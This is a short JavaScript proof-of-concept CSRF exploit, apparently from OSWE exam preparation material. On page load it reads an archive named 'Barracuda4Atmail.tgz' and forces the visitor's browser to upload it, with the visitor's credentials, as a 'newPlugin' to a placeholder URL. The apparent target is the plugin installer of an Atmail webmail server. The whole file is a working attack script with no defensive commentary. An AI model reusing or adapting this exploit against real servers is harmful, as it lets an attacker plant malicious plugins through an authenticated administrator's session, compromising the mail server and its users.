// Another good example: https://jorgectf.gitbook.io/awae-oswe-preparation-resources/general/pocs/csrf

var logUrl = 'http://example/';

function byteValue(x) {
    return x.charCodeAt(0) & 0xff;
}

function toBytes(datastr) {
    var ords = Array.prototype.map.call(datastr, byteValue);
    var ui8a = new Uint8Array(ords);
    return ui8a.buffer;
}

if (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {
	XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
	    this.send(toBytes(datastr));
	}
}

function fileUpload(fileData, fileName) {
	  var fileSize = fileData.length,
	    boundary = "9849436581144108930470211272",
	    uri = logUrl,
	    xhr = new XMLHttpRequest();

	  var additionalFields = {
	  }

	  var fileFieldName = "newPlugin";
	  
	  xhr.open("POST", uri, true);
	  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary); // simulate a file MIME POST request.
	  xhr.setRequestHeader("Content-Length", fileSize);
	  xhr.withCredentials = "true";
 
	  xhr.onreadystatechange = function() {
	    if (xhr.readyState == 4) {
	      if ((xhr.status >= 200 && xhr.status <= 200) || xhr.status == 304) {
	        
	        if (xhr.responseText != "") {
	          alert(JSON.parse(xhr.responseText).msg); // display response.
	        }
	      } else if (xhr.status == 0) {
	    	  //$("#goto").show();
	      }
	    }
	  }
	  
	  var body = "";
	  
	  for (var i in additionalFields) {
		  if (additionalFields.hasOwnProperty(i)) {
			  body += addField(i, additionalFields[i], boundary);
		  }
	  }

	  body += addFileField(fileFieldName, fileData, fileName, boundary);
	  body += "--" + boundary + "--";
	  xhr.sendAsBinary(body);
	  return true;
}

function addField(name, value, boundary) {
	var c = "--" + boundary + "\r\n"
	c += "Content-Disposition: form-data; name='" + name + "'\r\n\r\n";
	c += value + "\r\n";
	return c;
}

function addFileField(name, value, filename, boundary) {
    var c = "--" + boundary + "\r\n"
    c += "Content-Disposition: form-data; name='" + name + "'; filename='" + filename + "'\r\n";
    c += "Content-Type: application/x-compressed-tar\r\n\r\n";
    c += value + "\r\n";
    return c;	
}

function load_binary_resource(url) {
	  var req = new XMLHttpRequest();
	  req.open('GET', url, false);
	  //XHR binary charset opt by Marcus Granado 2006 [http://mgran.blogspot.com]
	  req.overrideMimeType('text/plain; charset=x-user-defined');
	  req.send(null);
	  if (req.status != 200) return '';
	  var bytes = Array.prototype.map.call(req.responseText, byteValue);
	  return String.fromCharCode.apply(this, bytes);
	  return req.responseText;
}

var start = function() {
	var c = load_binary_resource('Barracuda4Atmail.tgz');
	fileUpload(c, 'Barracuda4Atmail.tgz');
};

//var start = function() {
//	var c = "HEX-FILE-DATA"
//	fileUpload(c, "FILE-NAME");
//};

start()